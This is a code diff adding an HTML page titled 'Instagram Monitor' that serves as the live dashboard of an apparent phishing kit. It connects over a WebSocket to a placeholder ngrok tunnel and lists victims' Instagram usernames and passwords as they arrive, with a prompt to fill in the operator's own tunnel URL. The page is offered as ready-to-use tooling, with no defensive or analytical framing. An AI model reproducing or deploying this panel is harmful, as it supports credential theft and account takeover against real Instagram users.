@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Instagram Monitor</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; margin: 0; }
+        h1 { color: #4AA7FF; text-align: center; }
+        #logs { background: #111; padding: 15px; border-radius: 10px; border: 2px solid #4AA7FF; }
+        .entry { margin: 15px 0; padding: 10px; background: #1e1e1e; border-left: 4px solid #0f0; }
+    </style>
+</head>
+<body>
+    <h1>Live Instagram Credentials</h1>
+    <div id="logs">Waiting for data...</div>
+
+    <script>
+        // CHANGE THIS TO YOUR CURRENT NGROK URL
+        const socket = new WebSocket('wss://YOUR-CURRENT-NGROK-URL.ngrok-free.app');
+
+        socket.onopen = () => {
+            document.getElementById('logs').innerHTML = '<p style="color:#0f0">Connected! Waiting for typing...</p>';
+        };
+
+        socket.onmessage = (event) => {
+            const data = JSON.parse(event.data);
+            const logs = document.getElementById('logs');
+            const entry = document.createElement('div');
+            entry.className = 'entry';
+            entry.innerHTML = `
+<strong>Time:</strong> ${new Date(data.time).toLocaleTimeString()}<br>
+<strong>Username:</strong> ${data.username || '(empty)'}<br>
+<strong>Password:</strong> ${data.password || '(empty)'}
+            `;
+            logs.prepend(entry);
+        };
+    </script>
+</body>
+</html>
